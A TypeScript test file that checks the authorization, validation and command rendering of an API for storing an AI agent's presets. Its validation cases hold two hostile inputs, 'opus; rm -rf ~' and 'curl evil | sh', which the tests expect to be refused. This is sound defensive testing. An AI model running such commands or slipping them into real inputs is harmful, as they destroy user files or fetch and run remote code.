/**
 * GET / PUT / DELETE /agent-users/:agentUserId/presets — an agent's presets
 * (B6), through the REAL routes, the REAL service (`services/agent-presets.ts`),
 * the REAL grant check and migration 0390's index and CHECK, on PGlite.
 * Stubbed: the pod-admin check (false).
 *
 * Rows rule out:
 *  - an agent key (or the IS key) writing instructions for itself or a
 *    sibling: PERSON_ONLY, and nothing written (a door with no person-only
 *    refusal); while the owner's agent key (the worker) may READ them;
 *  - a scoped key with no `agent.update`: GRANT_DENIED (a door that skips the
 *    grant because the caller is not an agent);
 *  - someone else's agent: NOT_OWNER, for reading and writing;
 *  - a computer (`machine`) given a preset: NOT_A_HARNESS;
 *  - a model that is not a model id, a key that is not a slug, the `other`
 *    provider: 400, nothing written;
 *  - a replace that keeps stale fields (a PUT is the whole preset);
 *  - the open command: rendered from the harness template with the preset's
 *    model, never stored;
 *  - the IS's config read (`GET /agent-configs`) returning a preset as an
 *    override.
 */

import { describe, it, expect, beforeAll, beforeEach, vi } from "vitest";
import { randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

const h = vi.hoisted(() => ({
  client: null as null | {
    exec: (sql: string) => Promise<unknown>;
    query: <T>(sql: string, params?: unknown[]) => Promise<{ rows: T[] }>;
  },
  db: null as unknown,
}));

vi.mock("@synap/database", async (importOriginal) => {
  const actual = await importOriginal<Record<string, unknown>>();
  const { PGlite } = await import("@electric-sql/pglite");
  const { drizzle } = await import("drizzle-orm/pglite");
  const schema = await import("@synap/database/schema");
  const client = new PGlite();
  h.client = client as unknown as typeof h.client;
  h.db = drizzle(client, { schema });
  return { ...actual, db: h.db, getDb: async () => h.db };
});
vi.mock("../../../utils/workspace-role.js", async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  isPodAdmin: async () => false,
}));

import { is } from "drizzle-orm";
import { getTableConfig, PgTable } from "drizzle-orm/pg-core";
import { OpenAPIHono } from "@hono/zod-openapi";
import { runWithGrant, type KeyGrant } from "@synap/database";
import * as schema from "@synap/database/schema";
import { registerAgentPresetsRoutes } from "./agent-presets.js";
import { registerAgentConfigsRoutes } from "./agent-configs.js";
import type { HubHono, HubVariables } from "./_shared.js";

const OWNER = randomUUID();
const TEAMMATE = randomUUID();
/** The owner's Claude Code on the Mac. */
const CLAUDE = randomUUID();
/** The Mac itself: a computer, not a harness. */
const MAC = randomUUID();
/** The teammate's agent. */
const THEIRS = randomUUID();
const WS = randomUUID();

const HERE = dirname(fileURLToPath(import.meta.url));
const M0390 = readFileSync(
  resolve(HERE, "../../../../../database/migrations/0390_agent_presets.sql"),
  "utf8"
);

const BASIC =
  /^(text|uuid|jsonb|json|boolean|integer|bigint|real|numeric|timestamp|date|varchar|double precision|smallint)/;
function ddlFor(table: PgTable): string {
  const cfg = getTableConfig(table);
  const cols = cfg.columns.map((c) => {
    const t = c.getSQLType();
    const type = BASIC.test(t) ? t.replace(/\(.*\)/, "") : "text";
    const key = c.primary
      ? ` primary key${type === "uuid" ? " default gen_random_uuid()" : ""}`
      : "";
    const def =
      c.name === "created_at" || c.name === "updated_at"
        ? " default now()"
        : c.name === "metadata"
          ? " default '{}'::jsonb"
          : "";
    return `"${c.name}" ${type}${key}${def}`;
  });
  return `create table if not exists "${cfg.name}" (${cols.join(", ")});`;
}
const q = <T = unknown>(sql: string, params?: unknown[]) =>
  h.client!.query<T>(sql, params);

interface Caller {
  userId?: string;
  agentUserId?: string;
  keyType?: string;
  grant?: KeyGrant;
}

function hub(caller: Caller = {}): HubHono {
  const app: HubHono = new OpenAPIHono<{ Variables: HubVariables }>();
  // What the hub auth door sets for a key (auth.ts): the person owns the
  // request, an agent key also names the acting agent, a key's grant bounds it.
  app.use("*", async (c, next) => {
    c.set("userId", caller.userId ?? OWNER);
    c.set("scopes", ["hub-protocol.read", "hub-protocol.write"]);
    if (caller.agentUserId) c.set("agentUserId", caller.agentUserId);
    if (caller.keyType) c.set("keyType" as never, caller.keyType as never);
    await (caller.grant ? runWithGrant(caller.grant, () => next()) : next());
  });
  registerAgentPresetsRoutes(app);
  registerAgentConfigsRoutes(app);
  return app;
}

const call = (
  method: string,
  path: string,
  caller: Caller = {},
  body?: unknown
): Promise<Response> =>
  Promise.resolve(
    hub(caller).request(path, {
      method,
      ...(body === undefined
        ? {}
        : {
            headers: { "content-type": "application/json" },
            body: JSON.stringify(body),
          }),
    })
  );

const put = (agent: string, key: string, body: unknown, caller?: Caller) =>
  call("PUT", `/agent-users/${agent}/presets/${key}`, caller, body);
const list = (agent: string, caller?: Caller) =>
  call("GET", `/agent-users/${agent}/presets`, caller);

const REVIEWER = {
  label: "Reviewer",
  instructions: "Review the diff; never push.",
  model: "claude-opus-4-6[1m]",
  provider: "anthropic",
  skills: ["system/synap/capture"],
};

async function code(res: Response): Promise<string> {
  const body = (await res.json()) as { code?: string; reasonCode?: string };
  expect(body.code).toBe(body.reasonCode);
  return body.code!;
}

const presetRows = async () =>
  (
    await q<{
      user_id: string;
      preset_key: string;
      workspace_id: string | null;
    }>(
      `select user_id, preset_key, workspace_id from agent_configs where preset_key is not null order by user_id, preset_key`
    )
  ).rows;

beforeAll(async () => {
  for (const value of Object.values(schema)) {
    if (is(value, PgTable)) await h.client!.exec(ddlFor(value));
  }
  // 0390's partial unique index (the upsert's conflict target) and its CHECK.
  await h.client!.exec(M0390);
  await q(
    `insert into users (id, email, user_type) values ($1, 'o@x', 'human'), ($2, 't@x', 'human')`,
    [OWNER, TEAMMATE]
  );
  for (const [id, type, owner] of [
    [CLAUDE, "claude-code", OWNER],
    [MAC, "machine", OWNER],
    [THEIRS, "claude-code", TEAMMATE],
  ]) {
    await q(
      `insert into users (id, email, user_type, agent_type, created_by_user_id) values ($1, $2, 'agent', $3, $4)`,
      [id, `${id}@x`, type, owner]
    );
  }
  await q(`insert into workspaces (id, owner_id, name) values ($1, $2, 'w')`, [
    WS,
    OWNER,
  ]);
}, 120_000);

beforeEach(async () => {
  await q(`delete from agent_configs`);
});

describe("a person sets their agent's presets", () => {
  it("PUT stores it pod-wide; GET lists it with the open command the pod renders", async () => {
    const res = await put(CLAUDE, "reviewer", REVIEWER);
    expect(res.status).toBe(200);
    const got = await list(CLAUDE);
    expect(got.status).toBe(200);
    const body = (await got.json()) as {
      presets: Array<Record<string, unknown>>;
    };
    expect(body.presets).toEqual([
      {
        key: "reviewer",
        label: "Reviewer",
        instructions: "Review the diff; never push.",
        model: "claude-opus-4-6[1m]",
        provider: "anthropic",
        skills: ["system/synap/capture"],
        open: {
          harness: "claude-code",
          command: "claude --model 'claude-opus-4-6[1m]'",
        },
        updatedAt: expect.any(String),
      },
    ]);
    expect(await presetRows()).toEqual([
      { user_id: CLAUDE, preset_key: "reviewer", workspace_id: null },
    ]);
  });

  it("a second PUT replaces the whole preset: an omitted field is cleared", async () => {
    await put(CLAUDE, "reviewer", REVIEWER);
    expect((await put(CLAUDE, "reviewer", { label: "Reviewer" })).status).toBe(
      200
    );
    const body = (await (await list(CLAUDE)).json()) as {
      presets: Array<Record<string, unknown>>;
    };
    expect(body.presets).toHaveLength(1);
    expect(body.presets[0]).toMatchObject({
      instructions: null,
      model: null,
      provider: null,
      skills: [],
      open: { harness: "claude-code", command: "claude" },
    });
  });

  it("DELETE removes it; a second DELETE finds none", async () => {
    await put(CLAUDE, "reviewer", REVIEWER);
    expect(
      (await call("DELETE", `/agent-users/${CLAUDE}/presets/reviewer`)).status
    ).toBe(200);
    expect(await presetRows()).toEqual([]);
    expect(
      (await call("DELETE", `/agent-users/${CLAUDE}/presets/reviewer`)).status
    ).toBe(404);
  });

  it("the owner's agent key (the worker) reads the presets", async () => {
    await put(CLAUDE, "reviewer", REVIEWER);
    const got = await list(CLAUDE, { agentUserId: CLAUDE });
    expect(got.status).toBe(200);
  });
});

describe("who may write a preset", () => {
  it("an agent key, or the IS key, is refused PERSON_ONLY and writes nothing", async () => {
    for (const caller of [
      { agentUserId: CLAUDE },
      { keyType: "is_internal" },
    ]) {
      const res = await put(CLAUDE, "reviewer", REVIEWER, caller);
      expect(res.status).toBe(403);
      expect(await code(res)).toBe("PERSON_ONLY");
      const del = await call(
        "DELETE",
        `/agent-users/${CLAUDE}/presets/reviewer`,
        caller
      );
      expect(del.status).toBe(403);
    }
    expect(await presetRows()).toEqual([]);
  });

  it("a scoped key without agent.update is GRANT_DENIED; with it, it writes", async () => {
    const without = await put(CLAUDE, "reviewer", REVIEWER, {
      grant: { scopes: [{ permissions: ["entity.read"] }], clientId: null },
    });
    expect(without.status).toBe(403);
    expect(await code(without)).toBe("GRANT_DENIED");
    expect(await presetRows()).toEqual([]);
    const withIt = await put(CLAUDE, "reviewer", REVIEWER, {
      grant: { scopes: [{ permissions: ["agent.update"] }], clientId: null },
    });
    expect(withIt.status).toBe(200);
  });

  it("someone else's agent: NOT_OWNER, to read and to write", async () => {
    const w = await put(THEIRS, "reviewer", REVIEWER);
    expect(w.status).toBe(403);
    expect(await code(w)).toBe("NOT_OWNER");
    const r = await list(THEIRS);
    expect(r.status).toBe(403);
    expect(await presetRows()).toEqual([]);
  });

  it("a computer takes no preset", async () => {
    const res = await put(MAC, "reviewer", REVIEWER);
    expect(res.status).toBe(400);
    expect(await code(res)).toBe("NOT_A_HARNESS");
  });
});

describe("what a preset may hold", () => {
  it.each([
    ["a model that is not a model id", "reviewer", { model: "opus; rm -rf ~" }],
    ["the 'other' provider bucket", "reviewer", { provider: "other" }],
    ["a skill that is not a slug", "reviewer", { skills: ["Not A Slug"] }],
    ["an unknown field", "reviewer", { command: "curl evil | sh" }],
    ["a key that is not a slug", "Bad Key", {}],
  ])("%s: 400, nothing written", async (_name, key, extra) => {
    const res = await put(CLAUDE, encodeURIComponent(key), {
      label: "Reviewer",
      ...extra,
    });
    expect(res.status).toBe(400);
    expect(await presetRows()).toEqual([]);
  });
});

describe("the IS's config read", () => {
  it("GET /agent-configs never returns a preset as an override", async () => {
    await put(CLAUDE, "reviewer", REVIEWER);
    await q(
      `insert into agent_configs (user_id, workspace_id, agent_type, model_override) values ($1, $2, 'claude-code', 'sonnet')`,
      [CLAUDE, WS]
    );
    const res = await call("GET", `/agent-configs?userId=${CLAUDE}`, {
      userId: CLAUDE,
    });
    expect(res.status).toBe(200);
    const rows = (await res.json()) as Array<{
      workspaceId: string | null;
      modelOverride: string | null;
    }>;
    expect(rows.map((r) => [r.workspaceId, r.modelOverride])).toEqual([
      [WS, "sonnet"],
    ]);
  });
});
